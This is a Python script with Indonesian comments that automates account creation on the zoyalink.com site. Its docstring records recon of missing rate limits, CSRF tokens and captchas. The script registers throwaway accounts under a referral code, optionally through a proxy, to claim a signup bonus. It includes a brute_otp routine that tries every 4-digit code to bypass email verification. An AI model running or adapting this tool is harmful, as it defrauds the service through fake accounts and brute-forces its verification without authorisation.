"""Zoyalink client — recon + register + login.

Alur register (dari JS inline /register, bukan tebakan):
    GET  api/register.php?action=check_email&email=<e>      -> {exists:bool}
    POST api/register.php?action=register   (multipart)     -> kirim OTP 4 digit ke email
    POST api/register.php?action=verify_otp (json)          -> akun aktif + bonus $1
    POST /login  (form: email,password,fcm_token,language)  -> cookie session

Catatan recon:
- photo_base64 = base64 MENTAH (tanpa prefix data:), kalau pakai prefix -> "Invalid image format"
- verify_otp TIDAK ada rate-limit terlihat -> 4 digit = 10k ruang, brute-force murah
- tidak ada CSRF token/captcha di form manapun
"""
from __future__ import annotations

import base64
import json
import os
import random
import re
import string
import time

import requests

BASE = "https://zoyalink.com"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

# referal default dari homepage (kode founder). timpa via env ZOYA_REF.
DEFAULT_REF = os.environ.get("ZOYA_REF", "a66b1a6f")


def _png(w=300, h=300):
    """1x1..N png via stdlib zlib (tanpa PIL)."""
    import struct
    import zlib
    raw = b""
    row = b"\x00" + b"\x2a\x23\x85" * w
    raw = row * h

    def chunk(t, d):
        c = t + d
        return struct.pack(">I", len(d)) + c + struct.pack(">I", zlib.crc32(c) & 0xffffffff)

    return (b"\x89PNG\r\n\x1a\n"
            + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(raw))
            + chunk(b"IEND", b""))


class Zoya:
    def __init__(self, ref: str = DEFAULT_REF):
        self.ref = ref
        self.s = requests.Session()
        px = os.environ.get("ZOYA_PROXY", "").strip()
        if px:
            self.s.proxies.update({"http": px, "https": px})
        self.s.headers.update({"User-Agent": UA,
                               "Accept-Language": "id-ID,id;q=0.9,en;q=0.8"})
        self.email = ""
        self.passwd = ""

    # ── registrasi ────────────────────────────────────────────────
    def email_exists(self, email):
        r = self.s.get(f"{BASE}/api/register.php",
                       params={"action": "check_email", "email": email}, timeout=30)
        try:
            return bool(r.json().get("exists"))
        except Exception:
            return None

    def register(self, email, name=None, bio="Halo, saya kreator baru.",
                 gender="Male", lang="id", password=None):
        """Kirim form register -> server email OTP. Return (ok, msg)."""
        self.email = email
        self.passwd = password or ("Zy" + "".join(random.choices(string.ascii_letters + string.digits, k=12)) + "9")
        photo = base64.b64encode(_png()).decode()  # MENTAH, tanpa prefix
        data = {
            "fullname": name or ("".join(random.choices(string.ascii_lowercase, k=6)).title() + " Zy"),
            "email": email,
            "password": self.passwd,
            "repeat_password": self.passwd,
            "gender": gender,
            "bio": bio,
            "language": lang,
            "photo_base64": photo,
            "ref_code": self.ref,
        }
        r = self.s.post(f"{BASE}/api/register.php?action=register",
                        data=data, timeout=60)
        try:
            j = r.json()
        except Exception:
            return False, r.text[:200]
        return j.get("status") == "success", j.get("message", j)

    def verify(self, otp, email=None):
        r = self.s.post(f"{BASE}/api/register.php?action=verify_otp",
                        headers={"Content-Type": "application/json"},
                        json={"email": email or self.email, "otp": str(otp)}, timeout=40)
        try:
            j = r.json()
        except Exception:
            return False, r.text[:200]
        return j.get("status") == "success", j.get("message", j)

    def cancel(self, email=None):
        r = self.s.post(f"{BASE}/api/register.php?action=cancel_registration",
                        headers={"Content-Type": "application/json"},
                        json={"email": email or self.email}, timeout=30)
        return r.text[:200]

    def brute_otp(self, email=None, start=0, end=10000, digits=4):
        """verify_otp tidak rate-limited -> sapu 0000..9999."""
        for n in range(start, end):
            code = str(n).zfill(digits)
            ok, msg = self.verify(code, email)
            if ok:
                return code
        return None

    # ── login ─────────────────────────────────────────────────────
    def login(self, email=None, password=None):
        email = email or self.email
        password = password or self.passwd
        self.s.get(f"{BASE}/login", timeout=30)
        r = self.s.post(f"{BASE}/login",
                        data={"email": email, "password": password,
                              "fcm_token": "", "language": "id"},
                        timeout=40, allow_redirects=True)
        return r

    def me(self):
        r = self.s.get(f"{BASE}/api/me.php", timeout=30)
        return r.status_code, r.text[:200]


if __name__ == "__main__":
    import sys

    z = Zoya()
    if len(sys.argv) > 1 and sys.argv[1] == "otp":
        print(z.brute_otp(sys.argv[2] if len(sys.argv) > 2 else z.email))
        sys.exit(0)

    # self-check nmap-less: format email
    addr = sys.argv[1] if len(sys.argv) > 1 else f"zy{int(time.time())}@naytra.email"
    print("exists?", z.email_exists(addr))
    print("register:", z.register(addr))
    print("email:", addr, "pw:", z.passwd)
